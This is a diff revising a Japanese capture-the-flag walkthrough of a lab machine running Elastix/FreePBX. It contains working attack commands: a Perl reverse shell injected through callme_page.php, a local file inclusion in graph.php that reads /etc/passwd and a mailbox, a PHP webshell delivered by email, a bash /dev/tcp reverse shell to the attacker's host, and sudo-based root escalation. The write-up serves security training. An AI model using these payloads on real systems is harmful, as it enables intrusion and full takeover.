@@ -110,7 +110,7 @@ Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'+str(
 ```
 ということで、PoCに必要なextensionを発見
 ```sh
-└─$ svwar -t 0.1 -e 0-300 -m INVITE 10.129.229.183
+└─$ svwar -t 0.1 -e 0-300 -m INVITE 10.129.205.98
 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
 +-----------+----------------+
 | Extension | Authentication |
@@ -120,7 +120,7 @@ WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause 
 ```
 PoCのrce実行
 ```html
-└─$ curl --insecure --tlsv1.0 'https://10.129.205.98/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.11%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+└─$ curl -k 'https://10.129.205.98/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.11%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
@@ -249,7 +249,7 @@ uid=0(root) gid=0(root)
 
 
 ## PATH 3
-path2で、LFIを確認した
+443番ポートで動いているelastixには、lfiも存在するらしい
 ```sh
 └─$ searchsploit -m 37637 
   Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
@@ -260,9 +260,44 @@ path2で、LFIを確認した
 File Type: ASCII text
 Copied to: /home/kali/37637.pl
 ```
-smtpでメール本文内にphpのwebshellを埋め込み・送付
+PoCではfreepbxの設定ファイルらしい「/etc/amportal.conf」をlfiで確認している
 ```sh
-└─$ swaks --to asterisk@localhost --from kali@localhost --header "Subject: test shell" --body 'check out this code: <?php system($_REQUEST["cmd"]); ?>' --server 10.129.205.98
+#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+```
+「/etc/passwd」も確認でき、そのうちログインユーザを確認できた
+```sh
+└─$ curl -ks 'https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action' | grep -v nologin
+root:x:0:0:root:/root:/bin/bash
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+news:x:9:13:news:/etc/news:
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+spamfilter:x:500:500::/home/spamfilter:/bin/bash
+fanis:x:501:501::/home/fanis:/bin/bash
+Sorry! Attempt to access restricted file.
+```
+25番もオープンであったため、smtpでメール本文内にphpのwebshellを埋め込み・送付、  
+lfiでwebshell実行、リバースシェル取得を試みる  
+lfiで確認できたログインユーザのうち、「asterisk」ユーザのメールを確認できた
+```sh
+└─$ curl -ks 'https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action' | head    
+From asterisk@beep.localdomain  Fri Oct 27 21:04:02 2023
+Return-Path: <asterisk@beep.localdomain>
+X-Original-To: asterisk
+Delivered-To: asterisk@beep.localdomain
+Received: by beep.localdomain (Postfix, from userid 100)
+        id 2C1A9C0001; Fri, 27 Oct 2023 21:04:02 +0300 (EEST)
+From: root@beep.localdomain (Cron Daemon)
+To: asterisk@beep.localdomain
+Subject: Cron <asterisk@beep> /var/lib/asterisk/bin/freepbx-cron-scheduler.php
+Content-Type: text/plain; charset=UTF-8
+```
+「asterisk@beep.localdomain」にphpのwebshell埋め込みメール送付
+```sh
+└─$ swaks -f kali@beep.localdomain -t asterisk@beep.localdomain -d '<?php system($_REQUEST["cmd"]); ?>' -s 10.129.205.98
 === Trying 10.129.205.98:25...
 === Connected to 10.129.205.98.
 <-  220 beep.localdomain ESMTP Postfix
@@ -275,49 +310,37 @@ smtpでメール本文内にphpのwebshellを埋め込み・送付
 <-  250-ENHANCEDSTATUSCODES
 <-  250-8BITMIME
 <-  250 DSN
- -> MAIL FROM:<kali@localhost>
+ -> MAIL FROM:<kali@beep.localdomain>
 <-  250 2.1.0 Ok
- -> RCPT TO:<asterisk@localhost>
+ -> RCPT TO:<asterisk@beep.localdomain>
 <-  250 2.1.5 Ok
  -> DATA
 <-  354 End data with <CR><LF>.<CR><LF>
- -> Date: Fri, 27 Jun 2025 21:48:31 -0400
- -> To: asterisk@localhost
- -> From: kali@localhost
- -> Subject: test shell
- -> Message-Id: <20250627214831.570096@kali>
- -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
- -> 
- -> check out this code: <?php system($_REQUEST["cmd"]); ?>
+ -> <?php system($_REQUEST["cmd"]); ?>
  -> 
  -> 
  -> .
-<-  250 2.0.0 Ok: queued as E5F79C0003
+<-  250 2.0.0 Ok: queued as 6E145C0003
  -> QUIT
 <-  221 2.0.0 Bye
 === Connection closed with remote host.
 ```
-LFIでwebshellを実行できることが分かった
+lfiでwebshellを実行できることが分かった
 ```sh
-└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=id" | grep 'From kali@localhost' -A 30
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100 18434    0 18434    0     0  11360      0 --:--:--  0:00:01 --:--:-- 11357
-From kali@localhost.localdomain  Sat Jun 28 04:48:53 2025
-Return-Path: <kali@localhost.localdomain>
-X-Original-To: asterisk@localhost
-Delivered-To: asterisk@localhost.localdomain
+└─$ curl -ks 'https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=id' | tail -n 18
+From kali@beep.localdomain  Sat Jun 28 04:48:53 2025
+Return-Path: <kali@beep.localdomain>
+X-Original-To: asterisk@beep.localdomain
+Delivered-To: asterisk@beep.localdomain
 Received: from kali (unknown [10.10.16.11])
         by beep.localdomain (Postfix) with ESMTP id E5F79C0003
-        for <asterisk@localhost>; Sat, 28 Jun 2025 04:48:52 +0300 (EEST)
+        for <asterisk@beep.localdomain>; Sat, 28 Jun 2025 04:48:52 +0300 (EEST)
+Message-Id: <20250627214831.570096@beep.localdomain>>
 Date: Fri, 27 Jun 2025 21:48:31 -0400
-To: asterisk@localhost
-From: kali@localhost
-Subject: test shell
-Message-Id: <20250627214831.570096@kali>
-X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+From: kali@beep.localdomain
+To: undisclosed-recipients:;
 
-check out this code: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
 
 
 
@@ -325,13 +348,13 @@ Sorry! Attempt to access restricted file.
 ```
 リバースシェル用のコマンド実行
 ```sh
-└─$ urlencode "bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"  
+└─$ urlencode 'bash -i >& /dev/tcp/10.10.16.11/4444 0>&1'
 bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261
 
-└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261"
+└─$ curl -k 'https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261'
 ```
-リバースシェル取得！
-sudoでchmodを操作できるので、rootがユーザであるbashにSUIDを付与し、権限昇格成功！
+リバースシェル取得！  
+[リンク](https://gtfobins.github.io/gtfobins/service/)通りで権限昇格成功！
 ```sh
 └─$ rlwrap nc -lnvp 4444
 listening on [any] 4444 ...
@@ -364,10 +387,11 @@ User asterisk may run the following commands on this host:
     (root) NOPASSWD: /sbin/chkconfig
     (root) NOPASSWD: /usr/sbin/elastix-helper
 
-bash-3.2$ sudo chmod 4755 /bin/bash
+bash-3.2$ pwd
+/var/www/html/vtigercrm
 
-bash-3.2$ /bin/bash -p
+bash-3.2$ sudo service ../../../../bin/sh
 
 id
-uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 ```
